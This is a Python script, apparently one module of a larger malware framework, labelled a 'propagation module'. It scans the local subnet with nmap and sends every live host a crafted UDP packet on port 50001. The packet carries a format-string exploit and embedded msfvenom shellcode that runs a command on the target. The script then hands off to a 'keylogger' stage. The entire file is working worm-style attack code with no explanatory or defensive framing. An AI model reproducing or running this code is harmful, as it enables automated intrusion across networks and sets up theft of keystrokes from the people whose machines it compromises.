#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        output = subprocess.check_output(command, shell=True, text=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d

#msfvenom -p linux/x64/exec CMD='touch ./youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode 
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xf8\x7c\xf3"
shellcode += b"\x92\x89\x12\xb4\x7e\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xb0\xc4\xdc\xf0\xe0"
shellcode += b"\x7c\x9b\x0d\x90\x7c\x6a\xc2\xdd\x4d\xe6\x18"
shellcode += b"\x90\x51\x90\xc6\xd7\x40\x5c\x67\xf8\x7c\xf3"
shellcode += b"\xe6\xe6\x67\xd7\x16\xd8\x52\xdc\xeb\xe6\x67"
shellcode += b"\xd5\x0c\x9d\x1a\x86\xf1\xe2\x77\xd0\x50\x8c"
shellcode += b"\x04\x87\x92\xdf\x45\xe0\x20\x92\x47\xab\x9d"
shellcode += b"\x8c\x12\xb4\x7e"

def run():
    next_action = ""
    data = ""
    print("[+] Propagation module activated...")

    # try:
    interface = get_interface()
    network = get_network(interface)
    port = 50001  # Define the port to scan
    neighbors = net_scan(network)
    print('Lets attack')
    print('Brute all active Hosts on Port 50001')
    
    for ip in neighbors:
        print(f'IP: {ip}')
        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln'+shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(p, (ip, port))
        s.close()
            
    # except Exception as e: 
    #     print(e)
    #     pass
        # exit()

    next_action = "keylogger"
    return data, next_action

if __name__ == '__main__':
    run()